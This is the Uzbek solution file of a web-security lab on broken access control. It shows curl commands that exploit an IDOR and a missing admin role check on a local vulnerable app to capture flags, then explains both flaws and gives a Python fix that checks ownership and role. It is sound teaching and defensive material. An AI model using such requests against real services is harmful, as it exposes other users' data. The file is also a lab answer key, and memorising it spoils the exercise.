🌐 [English](./SOLUTION.md) · [Русский](./SOLUTION.ru.md) · **Oʻzbekcha**

# A01 — Yechim (spoylerlar!)

Avval [README](./README.uz.md) dagi maslahatlardan foydalanib, laboratoriyani oʻzingiz bajarib koʻring.

## vulnerable da ekspluatatsiya (port 8001)

```bash
# 1. alice sifatida kirish, cookie jar.txt ga saqlanadi
curl -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' http://127.0.0.1:8001/login

# 2. Oʻz qaydlari: id = 1
curl -b jar.txt http://127.0.0.1:8001/api/notes

# 3. IDOR: begona id qoʻyamiz (adminning qaydi = 3)
curl -b jar.txt http://127.0.0.1:8001/api/notes/3
# → flag FLAG{a01_idor_admin_note}

# 4. admin roli boʻlmasdan administrator funksiyasiga kirish
curl -b jar.txt http://127.0.0.1:8001/admin/users
# → foydalanuvchilar roʻyxati va flag FLAG{a01_admin_panel_open}
```

## Xuddi shu portalda

`alice` sifatida kiring, ariza manzilidagi raqamni oʻzgartiring (`/#/requests/3`) va menyu bandi sizdan yashirilgan boʻlsa ham «Boshqaruv» sahifasini toʻgʻridan-toʻgʻri oching (`/#/admin`). fixed da (port 8002) ikkala sahifa ham «Kirish taqiqlandi» koʻrsatadi. Menyu bandini yashirish kirish nazorati oʻrnini bosmaydi: serverning oʻzi rad etishi kerak.

## Xato nimada

1. `GET /api/notes/<id>`: server faqat foydalanuvchi tizimga kirganini tekshiradi, lekin `note["owner"]` ni joriy foydalanuvchi bilan solishtirmaydi (**IDOR**).
2. `GET /admin/users`: server rolni tekshirmaydi, istalgan sessiya yetarli (**funksiyaga huquqlar tekshiruvining yoʻqligi**).

## Tuzatish

```python
# Resurs egasi
if note["owner"] != current_user():
    return jsonify(error="forbidden"), 403

# Administrator roli
def admin_required(view):
    @wraps(view)
    @login_required
    def wrapper(*args, **kwargs):
        if USERS[current_user()]["role"] != "admin":
            return jsonify(error="forbidden"), 403
        return view(*args, **kwargs)
    return wrapper
```

Xuddi shu soʻrovlar fixed da (port 8002) `403 forbidden` qaytaradi. Admin (`admin` / `Adm1n-lab-pass`) avvalgidek oʻz qaydlariga va `/admin/users` ga kira oladi.

## Yana nimani esda tutish kerak
- Yashirin yoki «oldindan aytib boʻlmaydigan» URL huquqlar tekshiruvining oʻrnini bosmaydi.
- Tasodifiy identifikatorlar (UUID) saralashni qiyinlashtiradi, lekin egani tekshirishni bekor qilmaydi.
- Huquqlarni faqat oʻqish uchun emas, yozish va oʻchirish amallari uchun ham tekshiring.
